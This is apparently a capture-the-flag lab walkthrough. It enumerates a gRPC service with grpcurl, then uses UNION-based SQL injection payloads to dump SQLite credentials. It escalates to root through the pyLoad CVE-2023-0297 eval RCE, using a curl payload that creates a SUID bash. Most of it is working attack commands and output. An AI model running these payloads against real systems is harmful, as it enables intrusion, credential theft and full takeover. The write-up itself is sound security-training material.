Phase 0

Reconnaissance

Nmap

$ sudo nmap -sCV -p- -T4 10.129.26.200
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
50051/tcp open  grpc

Only two ports. Port 50051 runs gRPC — a high-performance RPC framework by Google that uses Protocol Buffers over HTTP/2. Unlike REST APIs, gRPC services aren't browsable — you need a specialized client.

What is gRPC? gRPC lets different programs (possibly written in different languages, running on different machines) call each other's functions as if they were local. It uses binary Protocol Buffers instead of JSON, making it faster but opaque to standard web tools. Think of it as a high-speed intercom between microservices.

gRPC Enumeration with grpcurl

# Install grpcurl
$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List available services
$ grpcurl -plaintext 10.129.26.200:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

# List methods in SimpleApp
$ grpcurl -plaintext 10.129.26.200:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo

# Describe the message formats
$ grpcurl -plaintext 10.129.26.200:50051 describe .LoginUserRequest
message LoginUserRequest {
  string username = 1;
  string password = 2;
}

$ grpcurl -plaintext 10.129.26.200:50051 describe .getInfoRequest
message getInfoRequest {
  string id = 1;
}
Phase 1

Initial Access — gRPC SQL Injection

Register, Login, Get Token

# Register a test account
$ grpcurl -plaintext -d '{"username":"test123","password":"test123"}' \
  10.129.26.200:50051 SimpleApp/RegisterUser
{"message": "Account created for user test123!"}

# Login — use -v to see response trailers (contains JWT token)
$ grpcurl -plaintext -v -d '{"username":"test123","password":"test123"}' \
  10.129.26.200:50051 SimpleApp/LoginUser
Response contents:
{"message": "Your id is 144."}

Response trailers received:
token: b'eyJ0eXAiOiJKV1Qi...'

SQL Injection in getInfo

The id parameter in getInfo is injectable. The backend uses SQLite:

# Confirm SQLi with UNION SELECT
$ grpcurl -plaintext \
  -H "token: eyJ0eXAi..." \
  -d '{"id":"1 UNION SELECT 1--"}' \
  10.129.26.200:50051 SimpleApp/getInfo
{"message": "1"}

# Enumerate tables (SQLite uses sqlite_master)
$ grpcurl -plaintext \
  -H "token: eyJ0eXAi..." \
  -d '{"id":"0 UNION SELECT group_concat(tbl_name) FROM sqlite_master--"}' \
  10.129.26.200:50051 SimpleApp/getInfo
{"message": "accounts,messages"}

# Dump credentials
$ grpcurl -plaintext \
  -H "token: eyJ0eXAi..." \
  -d '{"id":"0 UNION SELECT group_concat(username||char(58)||password) FROM accounts--"}' \
  10.129.26.200:50051 SimpleApp/getInfo
{"message": "admin:admin,sau:HereIsYourPassWord1431"}
$ ssh sau@10.129.26.200
Password: HereIsYourPassWord1431

Phase 2

Privilege Escalation — pyLoad RCE (CVE-2023-0297)

Internal Service Discovery

sau@pc:~$ ss -tlnp
LISTEN  127.0.0.1:8000  0.0.0.0:*

Port 8000 runs pyLoad, a download manager. CVE-2023-0297 is a pre-authentication RCE — the /flash/addcrypted2 endpoint passes user input to eval() via the jk parameter.

Exploitation

# Inject SUID bash via pyLoad's eval vulnerability
$ curl -i -s -k -X POST \
    --data-binary 'jk=pyimport%20os;os.system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    'http://localhost:8000/flash/addcrypted2'

# Execute SUID bash
sau@pc:~$ /tmp/0xdf -p

0xdf-5.0# cat /root/root.txt
ae3cf5de1a66c05a6a5bd065c8d6e08d
Appendix

Key Takeaways

gRPC services are enumerable via reflection.

grpcurl can list services, methods, and message schemas. Always check port 50051 for gRPC.

JWT tokens hide in gRPC trailers.

Use -v flag to see response metadata. The token was in trailers, not the response body.

SQLite uses sqlite_master instead of information_schema.

When UNION SELECT works, identify the database engine first — SQLite and MySQL have different system tables.

Internal services are the real escalation path.

pyLoad on localhost:8000 had a pre-auth RCE. ss -tlnp is mandatory after every shell.
